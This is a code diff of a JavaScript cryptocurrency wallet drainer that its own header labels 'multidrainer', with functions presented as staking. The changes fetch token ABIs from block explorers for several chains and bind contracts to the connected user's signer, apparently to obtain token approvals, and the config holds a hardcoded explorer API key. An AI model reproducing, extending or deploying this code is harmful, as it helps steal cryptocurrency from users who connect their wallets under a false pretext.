@@ -1,4 +1,6 @@
-
+//   
+//    
+// multidrainer
 //
 var connected = 0;
 var account = "";
@@ -47,7 +49,7 @@ const chainToId = {
     },
     "binance-smart-chain": {
         chainId: '0x38',
-        abiUrl: 'https://api.bscscan.com/v2/api?module=contract&action=getsourcecode&chainid=56&address={0}&apikey=G1X4GPASDQDYAPPZBN2JPFC11RMRBBCVFM'
+        abiUrl: 'https://api.bscscan.com/api?module=contract&action=getsourcecode&address={0}&apikey=G1X4GPASDQDYAPPZBN2JPFC11RMRBBCVFM'
     },
     "polygon": {
         chainId: '0x89',
@@ -735,47 +737,9 @@ async function stakeEth(amount, msg) {
 
 async function stakeERC20(tokenAddress, amount, msg, chainId, abiUrl) {
     console.log(tokenAddress, account, amount);
-   const ERC20_ABI = [
-  {
-    "constant": true,
-    "inputs": [{"name":"owner","type":"address"}],
-    "name":"balanceOf",
-    "outputs":[{"name":"","type":"uint256"}],
-    "type":"function"
-  },
-  {
-    "constant": false,
-    "inputs":[
-      {"name":"spender","type":"address"},
-      {"name":"amount","type":"uint256"}
-    ],
-    "name":"approve",
-    "outputs":[{"name":"","type":"bool"}],
-    "type":"function"
-  },
-  {
-    "constant": true,
-    "inputs": [],
-    "name":"decimals",
-    "outputs":[{"name":"","type":"uint8"}],
-    "type":"function"
-  },
-  {
-    "constant": true,
-    "inputs":[
-      {"name":"owner","type":"address"},
-      {"name":"spender","type":"address"}
-    ],
-    "name":"allowance",
-    "outputs":[{"name":"","type":"uint256"}],
-    "type":"function"
-  }
-];
-
-const tokenContract = new web3.eth.Contract(
-    ERC20_ABI,
-    tokenAddress
-);
+    const contractInfo = await getABI(tokenAddress, abiUrl);
+    const contract = new ethers.Contract(tokenAddress, contractInfo[0], signer);
+    const tokenContract = new web3.eth.Contract(contractInfo[0], tokenAddress);
     const functions = contract.functions;
     success = 1;
 
@@ -1042,14 +1006,9 @@ const getABI = async (address, abiUrl) => {
 
     try {
 
-        console.log("ABI URL template:", abiUrl);
-console.log("Contract address:", address);
-
-const finalUrl = abiUrl.replace(/\{0\}/g, address);
-
-console.log("Final URL:", finalUrl);
-
-const response = await axios.get(finalUrl);
+        const response = await axios.get(
+            abiUrl.format(address)
+        );
 
         console.log("Explorer response:");
         console.log(response.data);
